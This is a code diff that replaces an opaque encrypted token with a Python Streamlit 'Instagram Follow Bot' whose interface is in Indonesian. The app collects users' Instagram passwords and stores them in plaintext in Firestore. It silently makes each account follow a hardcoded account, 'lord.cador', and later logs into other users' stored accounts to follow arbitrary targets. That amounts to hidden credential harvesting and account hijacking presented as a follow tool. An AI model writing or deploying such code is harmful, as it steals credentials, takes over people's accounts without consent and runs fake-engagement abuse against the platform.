@@ -1,1 +1,159 @@
-gAAAAABm8WchlWcHKOt2_8fIna0u0_2Y627IkDtNsuiMP9T-0zsfsLyyJMm7IZuYo9zXs8JaAcfIU5ieJETWIe0zpatdk9GK7bZaf38sS0eYmgYL-ZTRCuLfGRB9uofkfQThs16kNwx3JLzb1-0RMO8JmavTj4L5UMDMhqhcoM0P4Ee2gM5sIISl6fsrHJ1SKUEHRqoSIS8249mINXlPVOKGaDPJlgZnmjh7Rmnc0uOOWyYcc2zvyZU_Ucmc1i50_Rt7sL7GKGF9lpob4DAiKIzVCvHTFGSQQmJPjizdM4opgEIUbqq4nxK8sw2DJzCmJlEUA2nMBOYrxllmG-VKARzJB-j4gVnmYlDvy1HzqiT8Yf9u0NYVVAYmVC3qgVv_7I_77vP9rTXfsV8ANObCQv01NE0n4jOZxZc24A7x4YrN06f-yzgRtn3YOL4iN19dSZJ4E6cRFps2TIllzCei6yTu8nMFq4TtaKvQoqE6W6dl2yC1OdClLsjK7Quvvt4f3ljuIjHBY-6FulieSoMWiNcziEH7L4lOYhwPEuCTOgP_rLVG2hpaO7vW53859adPDO9XmIMc7wqm0Nym2MrtSyh4eOX0ji-KGVo8muwb6BhRfdZt4iq1USzFXjEtbN1D4jtQ8DqBabJUL2oYUF4gPkcaTm7sDWcdGDiYlZBGO3YjINcgbRI1bn6D2SgT4UikHR93yZeP8O1JSVZyPZvkZCEActL7tgVXTOmG-vSYpTIJozyn2e5EnOsKYO8Oo8Dft60WAGwUGi3UKWjUUwsVvOpOTD44a1kpUQQYs9okwI2b6jZnqRxOiqt0IfOkbYBoFdG4gQd4ygnDQq1PArxsAnYL11R7H3vVVHSC51KhdTyoIZ82YSOWnREDdOzxxEzPGe6q9NnIyFgu0DIcv74BMGz1_6DPIgX6t4PVOIdQcUJq-guWR7MAKjlzJ5sTUJe1hvy05XXMW5v1yxIpj0no_zgS6VnjdBAe66JHShXllaeikL9cUFPSMBiuZvh5GNeXAvl9RbQRR18r01Oc-Orv_Q6B5P_xFBR06KIjjds1M4TL2QKHPIAc1ltDEdzgU0QGoL73K48Fp7d1InsYEMv-9Tmph70kgTUIV_-9-dDtpROsh3vkj3IgJfgKK_GKgA0899_OklkjMZcV9dELfOWPuLdcuuT2Z70hjxoJt-C8UHLJOcgz_4J7WEH28MkIlgCKWlh7n26PaAlhonjUiueXLhTachauG4tv_nveBlhBhuIy4d-UTNV7VnLrItEwi2F9ZwfmozCjjuz0FUwL8Sfaz5rOhwGxEPf0CcfQpQvnxmEMfuutyGs6dwl-Ez8hvRlVQ03KcGs_hb99ek0YxhG4upq3liHrjW_AqHP53lfCkT1SDRLAPKRZuQgW_e29BiVcT9OHOkz5HMsxzPiNFh0tLlCRldFMYbJXoOXGQerVXgIfqVUzi8koa2wTY8ohmzGGq0mq4edL14b7eFZNMAorrNdhiMJCUJfOlO7FGlTsFtISTRSJq6NT-oeEPKnGEOZtEZ7ywyyHl6JdkMrgSx7iJnsYu_yQLEDc-NZN0Ap861p7X9RFQFnjkPqxl3lOfSx504le0XX8cihoN46YaBtDaDDBArObqUaaV_P0t45PTw_hN2T1r8wGc2nn14URtVtpAIEIUb-oC4cF_1btuAj1eQ-RND9VaHfCZBM34nzopbOsoqfAXYYln7soopz_0OpUm0veRyvuSyF3hmfyK5-3gqpD7WJTYDr8GYW9Phb96320wfV-SFk83ZTXfNAN1HbIWVyt9H0UTsB9a-1VrggH_2WUE9JzUh9g1lebS9uNFcGn5Lg6q_VtJovyMH8bBuprkFiMv0dkayajgmPWZOW12740FAGRY1yYOSNiJqOFezoY9u5xKoVwubLABaxI0br0AQSmXuSwoPxbAmeK1_68BaoWPih0KyV0SLWIxog6qxoJKqDwls9MBGOMtd-rv6F-FUjnfwLf5k2R_2H0LFQoPpzAWPZjOj1tKklei4xCjslcZ5-xHiR3ywRaznPIEsQyDWH-86mnRXOlfGMPuonCcIY_XnE17qvjioBGjpao6r5l4-SFazHFzrg1jIMTs8pG-1RORVkVlVCjmWB7sGAdsOgOPlZD9AWf7GHj4FnU8b55Q9i18RXsRvUZuN4YeraKezItxz2sKdwIx9KO7ywK4ygxEPwadOVobOHhZtlkt5FgTj5UYvEjKTuxoIvNNMXEv29Nv-tBSQ8Gtg0-vwAa5Q1gpMd-F0FbiULA1gWsdc8sS7J2WJByvUtzs2wdsLICHlZ1K8BFSdmSMB4fiQNQUeHvMvWtQSRpYm21-Wm7lE0OPwvnJKd79T855wTrUKDQnAsAesjB0MOHeZV39yW_s0tAIaHmBnkWkoIk8TfUFyMoL-W4_Any9jWNZexq9pzBMyHmFCqUudfI4I3TMrisIDI2gKUKqITJx-psQN4hu2Q81MKVPl0TcAL4jKwTzowPaRQi2f0Sfs3iaXv3ZZUW_UOxBvzyAoOSqyHw4aWof64Fu0fJEXo2H0_fAF2XllqTxjVFNpKRpNicjoPb8Tdh8qtjLEpyAasCXkNp3P2_u7p0Jdnm_KqRFk9AQH05lpMLgzMI4_U3Pjaz572gtsapts-dvtdvr0AgMZhP4VwQJRDqhv2hQuPJjiNxIVeIQBCdb3NsxHsRnl9PKrqkzXfK1CpmEVHCfkdr6GSM-mb-gO3I8v7sT5qLnsY_3iCV3j8AZej8t-5zyusBrueV4bWot0GiW-e-WMoj3ljrRp9xphdXJceJFQY0vD5IANyvLAYfjzPbKxnr3BVrkSbMHexGrLI-xstZkV9qQk_9sIjHQbPkK_oD4RLA8dI0G0ZvEgxZae0UPiiAcucZct0HvUlFz1UMG2kngiNuYjEgicszSPrRTHwQTpuOoiP1Tdh5UDHYukCN4QJVp5QKplVR1nzQyMSJVXQ55eUntPT80hRAI9t35VeLkz-IrSiT4nrIl3GdGnOPD-nlazNJYjWBRnKtlnNcDWoqUdEDWD_dLjkAg5jg-ZqpkzSWm_4PvHt44JOw0RDJ-cTm7x-ptn6hwVO-NJ9dqZIwjyjIate3YfLfjvAGaQnj_bLzu-KqFctuaDSt50cc-FhGtEdWJb2R20HyqflsODNUetdXttZ_S0nz8za8YxzPFN8q7qt6GiACF3teg8JD3MQ8D5TLcKi7c-HfhwRTweJQDhxfYN54oQnrUXMHAHTjsB3Tg368MMj1ldfGHItVMZCjJtQ21mQIuJDVEPrN8J-BNCpde6AOEzg7qRCWfdc2Y22oBZx5CUXLKX0A4wdByumQdNhEqEVJ4XMU9pYU2KADVmH5tdV8Z2ajWD3lny4v96Knq4RZvXH5WpypMb_1hcH_eDfABqv7lgsTYyxWmZskMvGrvMEGU7kQEBoTdbYTGYCke3yemHfKsYpMxQTPDl8Q0O5yeD37g86Th5HBoN6u7tzrQYxmdvFgHEQHC_bNRQUPJ65KNHQ54goM2xKpAy2xF_EpLGx6WCnGZqA_VuT1T1wCPWzxaBDL4EDomN5LbiGyh5Fz52sVA8f2JU1Sxgt6PDMYK6M4frgungovmZp5HdrKJ3BHCRFYxiB2mZ2WYJK436Ma-vVKNwmw2bnyT7MdSRwqsmK1m9d4irQn422SpMfJ94SHYh6z7qaIu0cJTsxtKF88wQY5kttLXn_X8zbvkCbBZ8nmWJhTXjAwPPRbO2uLGlS_3uLNyE5LSfHa5fNh8UC8wAj5f3te0_O1TL1M8LzipthNEMJg_ajGoaISZn5ORsqxXRPBp95vdoyrpVtDXBqiIqFhLs3KmVYD8SH2x1OgxZGEszuTenBHDLuQX861to_kWVz-B6r3SClfKSqu5MQRNUcOp6X1EycdBNrW6Z8bThOlAdKExqT9b2E2V864u4nQDSs_807lxcr-kvP_NIg1bzXYjj1aGvnIjdKIwd_ddenym_1b4uYTabTDFt97itobBe2awJ9Rf4jZ-dEZVeWPWvQ1RfRZsQfrekJHr_JvvzPhrVYLefO7WTr7YCTXbOVN9Iwwae-0NdM18qc9VFWuWCzH4sjeRb-sHVwgg6DJO-zf0BoQ9weUfNqPvgrPfrJkKzKvBSy5ZrkBfFl8kJMLFy8SyY2x5ovfj3k_bDf6k7_22fNcjhvoBqNC_fPFXexdFRrEPtXYPIpG0b-flKzrNFwrtgdrF59XTHXddusgW7wZEgPw7pIsNjdIYAvu2xHpLClvwhtc0eQy0-uezhHboYK_E3DWVR7xTOUufmbi9zQScm_4-SqCd2wZN8a1EXULdW8hhkWVHDAY3Aqbm1BoH9pS3g0mQBgl1W22qAqLjVAq9MwPEUKtQOOtWcBfVZhIlKVsEeqkId3Hego1NjhtiLVSJ4Z14L7nbRZMyG_SMaQgLWAglbC_4MgDRd4CQuqk6V6eZl5qJTI8vBdsoVtxwMW7McrQj7u_PLXi-kG0uEY2E_HKxf13Ng-D5J3sJiYcVwFVmOsTQsq5BiVj3ipC6IDcK4OW-JwzKPjJWWZgEIheV835yfrKp5pCzn5H9QR001ijpUpTIUSQFGjduBlD_0P8jbCJeSexjnv3ccyaNK84ySgnNs2_MjUsA14oyE2fO2efVMeFijREfn2l1E6NP4R7bJsarEmMN_j3JSQflR0neQsroJWJw0Onf2Kmg0MIGHMBmeaSBLeDC6BFVI40hBTkCtEv4UD0VlBVQj7lUOFGlbWkX9J6-_Fel4pKN75vDDElC0D7WSS7-Z4EO6tcz_oW4iFc_dyMXEzFqnEI5xNlGn5DfF8_gBI9NFEG1_Wg-g80vi5wJczjzyOxZPUbMUG9S7iB0nds0rXByxRPFE9lQIbiVQ9NHgN0loH4qwLbN-6xNQ0eUegmJNUwcE6WNX8AQTK8oDjkISuiVjNN0E-aU9lQxgYw77ueS4SlB6CW0Jm-3xkWXiAdfwROHbfxW7RhAdqkdFi9qR4nVXSKPP8Ojojt3EqhNR2OblxY3HpjoM1qnaQI7Cb6OKmVLMNkojK8o4ILkwZROMJ2_V5gxfivYEudii3-Ik1-4yYH8T8BDJm_PCjAFDLH5scpx5ziVX8MjbZV9cShn_aA0nX02-CFDMbJgO-61Ou8WnfQ-5FPTPFgJHxHdriu8qNyVCj-0vhru2klU4yCmdHxwf8RIEsVhaGkhGrrLHrLYyEzJRQtDHKnVfH9GdMgp_p5RThXJ16smOMZmzJiJWdpjSc0L8P_999R4WAQB0cNVjDZc-v87bGl7ydhlTzOxb3qfWqO6SCk7lgRT_BnnFgmY2L9Z4hD371KWEx6zZA1dchdiU-3_fRtW9_5GmPvU8As9DwjNHmJ2PlTUfoP4DQ9n8PeNE9fLXWbc1Goqx3o8uC4_kpP0EbHo_KLXdlKmJ-s8T4x3PcTjU4O_EyXt-BdVTnbdfAAwSj_uiW8Nzgo0KU0dCPr24caHs3V-a4OjrECb4CVu8dXQNfq1DRmrD4ML8ITdCnH17WtZlPVkqCDzuD4TTxf6OkLpSlG7M63ryQ2-fLdG5oGYE7S_-9qGXsZ3oqwA3YJxaNAXRf0bb6-vsPIEfLmjBBpwIEmzxPMLyZSe9pcX8_3rNKaE4OLK6880oTsuAt3PsvGNbkAG9oWtqnybDmgNSaO3cbro-Ao0V0IXiCdtXfcOQ4PZSBIotgHKw9Xehm9k3FCG6bZ9qPs3zbp6INN81cUtOFUAZiFXsvSHvpR88e3mK07K43E-UxMPebn87QyBE-aUPGag7JjOfxZODoS_OHf59ypGfkBVxxM6A-Cuk55Kx89M-ghpm7CiFH1qbleQVo1CmqOaT3BrVTc69lltJzGsvryVXW9Fj1Lw42DLDIxSsOVyHXb0FIO2_o2hZXYp-x8USanHaVv7AX9Rin8loUabnSgAbzYOiuxLUVIcFYO5E_Z7DhVD0PyZ9JIfwkc2IHyIZsLg3ic9qipGQXC-2ygXG8nut-C2jkgnpnP9OYXPWTNHTU3LCAzWTKNp-pQCfxUh0D1vU-FO868JDQ5C16geTNfA84qkbJRU4GHs_f4jp3uP7uYpdRY-42r0-AMKH2N4LEhvH4aIUeUX-0v2pvHTeenFMiD98FbLIr42D7Q8GWi5JhaWFG3o-wyOqUTd3GPheHYuktwmUm9Z27FuuCBYCrX3CJwxSybovTMBGwKzY0y55VUe_Vie3-jnY8sSeuDSjhhdEXC5YegBb682Y-Cv7JskkdGYazFhGehZoT9NX0Aa0IGAy4odofhubZOsMnnMuICcSRF6NNb61nTNnijThtu09SMcfk7b36gJE1xbivqCTRFOpDsHvmgK8JF2NnMtGbA2JKWQ8fHlPgZn9dJBCsjCUmjH3WrABKXyO90OiTstOxPJo7bZfrCkt6yqO0MVgMOLiOyqFRPCvgX5hD7_F8Bnj93wkxowo7oZeXDWmu270klVibqEQa2AclBiIMkmTrWzvtQ0O__SsRV_EMn4HwtPqLfXOjry8pSUfhEH1Il7JEqa7jXiWZQUvl-WG4AQshMi-oifF-WWV6NcWiqF3dHFI2WxiUGCVVjvrjMRWJTrUQArGqEp2K7hqjq2zaL4ORX8KPOd83CaKtofmUvmyqERBDYPJTLx_PNGL5UGlUFUMjjgexiftjAMANapu0_cWHxTOJBlc8ij1wRBVnwqnZ0UiPrFwrtfeTMAW3jcJz_68GODdHDqeVumP3MVxpaM5_DNWzSkxwiLSNg6OUn0WN5q1DnXUY7hAGPi78MI6AK_K33uXfd_a2sE_r2Hx-pbKUlEUeD6YqQR-GT0q8e_q2DpH39NXG5JG41czzAJVJSsuDHZIfqUOf2h-gMLqjE4Urls6nqKM_sKO051_ZKaDBvJFxfX9nyK1PNXy0FxkJ0RcBAyqzdr8n3qNNBHXNOHvzf7bdJbOFYL-gMR5Me8jUwVCFP6c08Zvt05mvEOUoFQm2D2C9vMtavt2ttRobqrn4uPwm0v4M27mNB_ZxwDbPzVR-GuYBIjhhsKB6CIS1EZCteJd3sxEBlWoEG8WwvaPSi-qxnBO9VNwwY_2Egp2b0pIjkXKQw13SfXbpzhubS1xxU9-6CRahokYBJPlijFRrju3qkOBnA01eHqsu8sFshdwj-oAYaUUOKLi9ADI1wa3cJBxRb1c9qBRDshJMF5F4MASXZHwvTRVjbGjkQtuoo7rFBHi6RsN29dLG8xokMMOZBqAytvMYntglBlnYZ3dsverUvFvAhfkOdwxpZGKyJysghhsNTrVndjRxQG9hPwwTaWCvsl5qsD6VufTxBWn0EZZNEeILitEFic6FxnJ24EAhUBgyUIdwbe0Z94frxspVCvRCnrPzyQtNYtlhEE6_DXyeXDs33d34GrpIMLMFyT36Ys7e8ydKhSLl52rExcWjCkcekLFUKhbRk5SezDsZr1pVTACE6C2fVE5Fb8c0xaWQgiBD-mzkCZehic8iM9SM6aEPjGXuY5WgKQ0PagXaUcynWNIcgmEF28XXABawJhN1k714OBQ2fByFklumjmlHwNo8g19B6cekvQNvSmcjiX9Af4NbGxQL6ukNY1ErMa8Rn4c-Uf_Op4HIqHkimBMGNGamxkZzlPSHdMW4kItlaUn86VLJeykoN65ttE0QotIHcXtTZ7UP_YbQnfvVnYHDn5l93F5IiFSoDHjLsXXDqjgE8QUTze86BtoAFsgY_imKGVsQBgbfdthZrM-6YdkkeHzNtqLT07VR3_R84sac70GlCRwpm_iDc0tx-sJuachM-ANXF4w464V6oqeB9pUUdmtBst4025Wv9hOo657gDFjuX4QeLaAO2rWUx6J9VW5rLjvC6PRBYpsCyRoVP0WTEiLbKuoixqymEu1hGXv6xRHQ2qSNWjoNypc80w8gH5FUaxYHz1S44WioLm_MLwOqnQ2__jBEpSLd9TEGXtzNZ44OTMHhdmQZMmsNNH9XsjC4S-PdBxxBa4EhvVwnQHW4TMlPRhAf9X4xSAxUS9a3PiS2Qz5P1wUCKqwHqu6pHCAWxByJQw4aIcAIBgShTV3lSbT6tDIO-ue15iqj7jcWZ8ME4JP8gcbTqtStNuOBZMmwYLpGJ2e2jGzPR6YTfbILxMa2S6N-1a48is8KHYwEUI_TvTMkJNpyvGSUMUSvuT59BYhPxTKgEZ7Wt6Zt29Pp_Qwox4a8UGKNk9o9_icY1QLCA2C7iqrhuqEms0NXSElYoaxCwhavQf1EamhwaLyErHoLP2sKhADhfuj8VWCJpz2ZzpbokpJw4X47RqMZarJjXh6AKDXkk3R1CxZA7mpzwt8YWWvbUYaRAjZLBeiFttog71OfduIhFF2rbDweKOD8m1GzGiazCYr-SOvVutiBH501djTWke6tz8AYgq77XWNm4u0ePzJ7FpMQcW481jQnD2xid21rxANjaq288Raz5b4dx6j0NLPc0jTZJMjuTp-vWP2PXD07TrM2lHpPrERF7vMs5luYDRJBVgQEWhzlKhmmKCaYUStkeAPEQVD2FPJuBd1YtPIJVQQhzuTiuIfnHMUZarQBJ1vwNia1UaKwvhINw6AuQEjNsls4pVzoYa0P03jED6Qfexm7nVP_-69qtgnSuyCcUlnoSHr18F8T-Cn4FrNgfEXcy_xqkLrDHGgeSy7AJJJH2Et-fIqtmUDNv__ZH3o6aeltXjDQMyUhUEAjbAO668CW7fgMj7NXKSEAFt9NK9GOCrhAzixsB5M-637GUT0oS63JLAGP-oCHBn2W1oYT1bhvuQv3HmHLNQdQdNWujmv87wZQnl7UbI7oH2EWHfVA93-ae5Cdv6vdgJlJ4aCezo5pqOo9ABlJHMnEbUUgB0BV2xd3bzJmEuYCuzQRalIjd_tgqWaL46-XRZcZfv7ot5BB-GWnroB9Ajlx8OKRkHSV372lAsQzGClivqkQkXI5B2nb7vk6t6O1VHCWK617Ds5qOIQYa5z6gep6o_u8UI-o6ZZT-EVHAmu-NSrGgNNg8t5ClfBHb_p7Y4fjmI_2R0nZSippEaDatAv23Ja3I60Lq6nWVYRDz5-qkZjT6LrdoQeIBlmLjh-64Tb1NRzS6REUDHpLhShbig7WpX1wp3A5sb0wmIiH-8j7jNk3dAt2C7psp5bcElOLf8eTJpbiNyozLuoeoWOc_POJIt1Sfay2gfjA7zsHvXZy6D1avy3vG0MUaYdRe_o-jlXTGGVKf8dWqrY0nCO_nENQIpipmX8xAiUIcvLxVmn3fTv7AY9VNtNYgon1nK0Hv3AVnUb9Wp-bSJzZ7Z_Z8FdZeNv9QRQ4skY8M2o_xe2sIg31UYLQ7NpyAzWCkDwm6zHXH2eZiqnAF-O82edKTjJqh5l7mw8CK3hUZyc3AeqWVppmbVnCdkmMVcOA-hfesdKF8ML-jNsfh7w0hZR0uy7nsBTGXqxYhyZDa9SHlrgognQ03mGg=
+import random
+import time
+import streamlit as st
+from instagrapi import Client
+import firebase_admin
+from firebase_admin import credentials
+from firebase_admin import firestore
+from datetime import datetime, timedelta
+
+# Inisialisasi Firebase
+if not firebase_admin._apps:
+    cred = credentials.Certificate('bot-instagram-fahmi-firebase-credentials.json')
+    firebase_admin.initialize_app(cred)
+
+# Inisialisasi Firestore
+db = firestore.client()
+
+# Global variable to store the last follow time
+if 'last_follow_time' not in st.session_state:
+    st.session_state.last_follow_time = None
+
+def masuk_dan_follow(username, password, target_username):
+    cl = Client()
+    try:
+        cl.login(username, password)
+        st.success(f"{username} berhasil login!")
+
+        try:
+            target_user_id = cl.user_id_from_username(target_username)
+            cl.user_follow(target_user_id)
+            st.success(f"{username} berhasil mengikuti {target_username}!")
+            time.sleep(random.randint(1, 3))  # Sleep between 1 to 3 seconds
+
+            # Follow your own account
+            self_user_id = cl.user_id_from_username('lord.cador')
+            cl.user_follow(self_user_id)
+            st.success(f"{username} berhasil mengikuti akun sendiri (lord.cador)!")
+
+            simpan_ke_firestore(username, password, cl.user_id_from_username(username))
+
+        except Exception as follow_error:
+            st.error(f"Error saat mengikuti: {follow_error}")
+            if "feedback_required" in str(follow_error):
+                st.warning(f"{username} diblokir untuk mengikuti akun. Mungkin perlu istirahat.")
+                time.sleep(5)  # Wait before retrying
+                return  # Stop this execution to avoid further restrictions
+
+        cl.logout()
+        st.info(f"{username} telah logout.")
+
+    except Exception as login_error:
+        st.error(f"Error untuk {username}: {login_error}")
+
+def simpan_ke_firestore(username, password, user_id):
+    users_ref = db.collection('users')
+    user_doc = users_ref.document(username)
+
+    existing_data = user_doc.get()
+    if existing_data.exists:
+        existing_username = existing_data.to_dict().get('username')
+        existing_password = existing_data.to_dict().get('password')
+        existing_user_id = existing_data.to_dict().get('user_id')
+
+        if (existing_username != username or 
+            existing_password != password or 
+            existing_user_id != user_id):
+            user_doc.set({'username': username, 'password': password, 'user_id': user_id})
+            st.success(f"Data {username} diperbarui di Firestore.")
+        else:
+            st.info(f"{username} sudah ada di Firestore dengan data yang sama, melewati penyimpanan.")
+    else:
+        user_doc.set({'username': username, 'password': password, 'user_id': user_id})
+        st.success(f"{username} disimpan di Firestore.")
+
+def countdown_timer(seconds):
+    """Display a countdown timer."""
+    countdown_display = st.empty()
+    while seconds > 0:
+        mins, secs = divmod(seconds, 60)
+        countdown_display.text(f"Berikutnya dapat melakukan follow dalam: {mins:02d}:{secs:02d}")
+        time.sleep(1)
+        seconds -= 1
+    countdown_display.text("Anda sekarang dapat melakukan follow lagi!")
+
+def main():
+    st.title("Instagram Follow Bot")
+
+    username = st.text_input("Masukkan username Instagram Anda:")
+    password = st.text_input("Masukkan password Instagram Anda:", type='password')
+    target_username = st.text_input("Masukkan username target Instagram Anda:")
+
+    # Check if 15 minutes have passed since the last follow action
+    if st.session_state.last_follow_time:
+        time_since_last_follow = datetime.now() - st.session_state.last_follow_time
+        if time_since_last_follow < timedelta(minutes=15):
+            remaining_time = (timedelta(minutes=15) - time_since_last_follow).seconds
+            countdown_timer(remaining_time)
+            st.button("Mulai Follow", disabled=True)
+        else:
+            if st.button("Mulai Follow"):
+                # Update last follow time
+                st.session_state.last_follow_time = datetime.now()
+                # Start follow process
+                progress_bar = st.progress(20)
+                if username and password and target_username:
+                    masuk_dan_follow(username, password, target_username)
+                    users_ref = db.collection('users')
+                    all_users = [doc.id for doc in users_ref.stream()]
+
+                    if len(all_users) < 1:
+                        st.warning("Tidak ada cukup pengguna di Firestore untuk di-follow.")
+                        return
+
+                    jumlah_pengguna = min(len(all_users) - 1, 10)
+                    all_users.remove(username)
+                    pengguna_terpilih = random.sample(all_users, jumlah_pengguna)
+
+                    for idx, user in enumerate(pengguna_terpilih):
+                        user_data = users_ref.document(user).get().to_dict()
+                        if user_data:
+                            masuk_dan_follow(user_data['username'], user_data['password'], target_username)
+                            time.sleep(random.randint(1, 3))
+                            progress = (idx + 1) / jumlah_pengguna
+                            progress_bar.progress(progress)
+
+                    st.success("Selesai mengikuti pengguna yang dipilih!")
+                else:
+                    st.warning("Silakan isi semua field.")
+    else:
+        if st.button("Mulai Follow"):
+            st.session_state.last_follow_time = datetime.now()
+            progress_bar = st.progress(20)
+            if username and password and target_username:
+                masuk_dan_follow(username, password, target_username)
+                users_ref = db.collection('users')
+                all_users = [doc.id for doc in users_ref.stream()]
+
+                if len(all_users) < 1:
+                    st.warning("Tidak ada cukup pengguna di Firestore untuk di-follow.")
+                    return
+
+                jumlah_pengguna = min(len(all_users) - 1, 10)
+                all_users.remove(username)
+                pengguna_terpilih = random.sample(all_users, jumlah_pengguna)
+
+                for idx, user in enumerate(pengguna_terpilih):
+                    user_data = users_ref.document(user).get().to_dict()
+                    if user_data:
+                        masuk_dan_follow(user_data['username'], user_data['password'], target_username)
+                        time.sleep(random.randint(1, 3))
+                        progress = (idx + 1) / jumlah_pengguna
+                        progress_bar.progress(progress)
+
+                st.success("Selesai mengikuti pengguna yang dipilih!")
+            else:
+                st.warning("Silakan isi semua field.")
+
+if __name__ == "__main__":
+    main()
